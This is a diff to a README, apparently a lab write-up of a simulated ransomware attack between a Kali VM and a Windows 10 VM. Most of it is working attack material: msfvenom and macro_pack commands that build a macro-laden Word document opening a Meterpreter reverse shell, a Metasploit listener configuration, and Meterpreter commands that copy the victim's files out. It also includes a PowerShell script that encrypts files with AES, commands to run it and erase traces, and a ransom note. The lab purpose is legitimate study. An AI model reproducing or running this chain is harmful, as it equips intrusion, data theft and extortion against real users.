@@ -11,29 +11,29 @@ The attacker will then **exfiltrate** victim's files over the established channe
 <br/>
 
 ## Threat Model
-The **Threat Model** necessary for this attack requires the adversary
-* knowing the e-mail address of the victim; 
-* being able to lure the victim to open the Spearphishing Attachment;
-* being able to establish a TCP connection with the victim's machine;
-* acquiring enough privileges on the victim's system in order to execute exfiltration and encryption commands.
+The **Threat Model** necessary for this attack requires the adversary to
+* know the e-mail address of the victim; 
+* lure the victim to open the Spearphishing Attachment;
+* establish a TCP connection with the victim's machine;
+* acquire enough privileges on the victim's system in order to execute exfiltration and encryption commands.
 
 <br/>
 
 ## Setup
-To perform the attack described above I used two Virtual Machines (referenced to as VMs in the following)
-1. The attacker is associated with a Kali Linux VM, with IPv4 Address `192.168.56.102`;
-2. The victim runs a Windows 10 VM, with IPv4 Address `192.168.56.101`.
+To perform the attack described above I used two Virtual Machines (referenced to as VMs in the following):
+1. the **attacker** is associated with a **Kali Linux VM**, with IPv4 Address `192.168.56.102`;
+2. the **victim** runs a **Windows 10 VM**, with IPv4 Address `192.168.56.101`.
 
-Both VMs have their network adapter configured as "Attached to NAT" in order to allow intra-communication withing the local network, but also inter-communication on the internet.
+Both VMs have their network adapter configured as "Attached to: **Host-only Adapter**" in order to just allow intra-communication within the local network.
 
 <br/>
 
 ## Preliminaries
-In order to create the Word document containing the malicious VBA Script, I have used `msfvenom` and a tool called [macro_pack](https://github.com/sevagas/macro_pack). Running the following command on Kali VM
+In order to create the Word document containing the malicious VBA Script, I have used `msfvenom` and a tool called [macro_pack](https://github.com/sevagas/macro_pack); in particular, I execute the following command on the Kali VM:
 ```
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.56.102 LPORT=4444 -f vba > reverse_shell_exploit.vba
 ```
-I am able to obtain a VBA Script that, when executed, will try to establish a TCP connection to the pair `<IPv4, Port> = <192.168.56.102, 4444>`. To make it more effective, I have edited it in order to launch a thread to do so:
+In this way, I am able to obtain a VBA Script that, when executed, will try to establish a TCP connection to the pair `<IPv4, Port> = <192.168.56.102, 4444>`. To make it more effective, I have edited it in order to launch a thread to do so:
 ```vb
 #If VBA7 Then
     Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
@@ -106,15 +106,15 @@ macro_pack.exe -f reverse_shell_exploit.vba -o -G malicious.docm
 <br/>
 
 ## Spearphishing
-Once the adversary was able to generate the payload `malicious.docm`, he needs to inject it into the victim's environment. I tried to perform a Spoofed Spearphishing Attack using [The Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) and replicating the `units.it` domain using [hMailServer]( https://www.hmailserver.com), but there were compatibility issues as stated [here](https://github.com/trustedsec/social-engineer-toolkit/issues/810).<br/>
-Therefore I assumed that the adversary was able to obtain **Valid Credentials** for one **Domain Account** of the `units.it` domain, so it was indeed able to send the required Spearphishing Attachment to the victim.
+Once the adversary generates the `malicious.docm` document, he needs to inject it into the victim's environment. I tried to perform a Spoofed Spearphishing Attack using [The Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) and replicating the `units.it` domain using [hMailServer]( https://www.hmailserver.com), but there were compatibility issues as stated [here](https://github.com/trustedsec/social-engineer-toolkit/issues/810).<br/>
+Therefore I assumed that the adversary managed to acquire **Valid Credentials** for one **Domain Account** of the `units.it` domain (additional Threat Model), so to be able to send the required Spearphishing Attachment to the victim.
 
 ![Photo of Mountain](images/mountain.jpg)
 
 <br/>
 
 ## Initial Access & Execution
-In order to be able to have a **reverse shell** at the victim's side connected to a remote shell client at the adversary's side, the attacker needs to launch a **listener** (prior to the opening of the `malicious.docm` payload).<br/>
+In order to have a **reverse shell** at the victim's side connected to a remote shell client at the adversary's side, the attacker needs to launch a **listener** (prior to the opening of the `malicious.docm` document).<br/>
 To do so, I have created a handler configuration file for `metasploit`, namely `handler.rc`, to instruct it to listen at port `4444` for TCP connections:
 ```
 use exploit/multi/handler
@@ -131,27 +131,29 @@ set HandlerSSLCert /path/to/cert.pem
 set StageVerificationCode random
 exploit -j
 ```
-Then the listener is launched using the command
+Then the listener is launched using the command:
 ```
 msfconsole -q -r handler.rc
 ```
-When the victim opens the `malicious.docm` payload, the VBA Script will attempt to open a TCP connection to the adversary-controlled listener, by continuously migrating among processes running on the victim's machine, or by spawning new ones, until a TCP connection is successfully established.
+When the victim opens the `malicious.docm` document, the VBA Script will attempt to open a TCP connection to the adversary-controlled listener, by continuously migrating among processes running on the victim's machine, or by spawning new ones, until a TCP connection is successfully established.
+
+![Photo of Mountain](images/mountain.jpg)
 
 <br/>
 
 ## Exfiltration
-From the remote shell client, the adversary can now move around the victim's File System. Depending on the privilege level and access rights the adversary is able to obtain on the victim's environment, the attacker might not be able to access all resources. I assumed that critical resources where inside the `C:\\Users\\enrico\\Desktop\\Very_Important_Stuff\\` directory, so the adversary can exfiltrate all contained files by executing
+From the remote shell client, the adversary can now move around the victim's File System. Depending on the **privilege level** and **access rights** the adversary is capable of acquiring on the victim's environment, the attacker might not be able to access all resources. I assumed that critical resources where inside the `C:\Users\enrico\Desktop\Very_Important_Stuff\` directory, so the adversary can exfiltrate them by executing the following command:
 ```
 download -r C:\\Users\\enrico\\Desktop\\Very_Important_Stuff\\ /home/kali/Desktop/Exfiltrated
 ```
 
+![Photo of Mountain](images/mountain.jpg)
+
 <br/>
 
 ## Impact
-To compromise the integrity of the exfiltrated files in order to make them unusable by the victims, I have created this powershell script
+To compromise the integrity of the exfiltrated files in order to make them unusable by the victim, I have created this Powershell script:
 ```powershell
-# AES Encryption Ransomware Simulation Script
-
 # Generate a random AES encryption key and IV
 $key = New-Object byte[] 32
 [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
@@ -205,18 +207,29 @@ Get-ChildItem -Path $targetFolder -File -Recurse | ForEach-Object {
 
 Write-Host "Encryption complete. Files are now unreadable."
 ```
-This script needs to be uploaded into an adversary-chosen location using
+This script needs to be uploaded into an adversary-chosen location on the victim's platform:
 ```
 upload /home/kali/Desktop/encrypt.ps1 C:\\Users\\enrico\\Documents\\encrypt.ps1
 ```
-and then executed
+and then executed:
 ```
 execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\\Users\\enrico\\Documents\\encrypt.ps1"
+```
+To avoid leaving traces, I also exfiltrate the encryption/decryption key
+```
+download -r C:\\Users\\enrico\\Documents\\encryption_key.bin /home/kali/Desktop/Exfiltrated
+```
+and remove from the victims machine both the key and the Powershell script:
+```
+rm C:\\Users\\enrico\\Documents\\encrypt.ps1"
+rm C:\\Users\\enrico\\Documents\\encryption_key.bin"
 ```
 To inform the victim of the compromise and demand a ransom, I leave the following message as a `README.txt` file inside the disrupted folder:
 ```
 execute -f cmd.exe -a "/c echo Your files have been encrypted. Contact your.worst.enemy@pj5.w49ol.ru to recover them. > C:\\Users\\enrico\\Documents\\README.txt"
 ```
+
+![Photo of Mountain](images/mountain.jpg)
 
 <br/>
 
@@ -224,4 +237,4 @@ execute -f cmd.exe -a "/c echo Your files have been encrypted. Contact your.wors
 - I have taken inspiration for this attack by following [Lockard Security](https://www.youtube.com/@lockardsecurity/videos) Youtube channel.
 - I have followed [this](https://www.youtube.com/watch?v=UTd8mL2itUo) tutorial for installing Microsoft Word LTSC 2021 on the Windows 10 VM.
 - The setup of the custom SMTP Server was based on a [SMTP Server setup guide](https://mailtrap.io/blog/setup-smtp-server/) of the [Mailtrap](https://mailtrap.io/blog/) blog.
-- I have learnt how to write en encryption script in Powershell essentially by following [PoshCodex](https://www.poshcodex.co.uk/) and, in particular, the [Part 1](https://www.poshcodex.co.uk/2024/11/14/powershell-working-with-aes-encryption-part-1/) and [Part 2](https://www.poshcodex.co.uk/2024/12/07/powershell-working-with-aes-encryption-part-2/) of the "Powershell: Working with AES encryption" blog post.
+- I have learnt how to write en encryption script in Powershell essentially by following the [PoshCodex](https://www.poshcodex.co.uk/) blog and, in particular, the [Part 1](https://www.poshcodex.co.uk/2024/11/14/powershell-working-with-aes-encryption-part-1/) and [Part 2](https://www.poshcodex.co.uk/2024/12/07/powershell-working-with-aes-encryption-part-2/) of the "Powershell: Working with AES encryption" blog post.
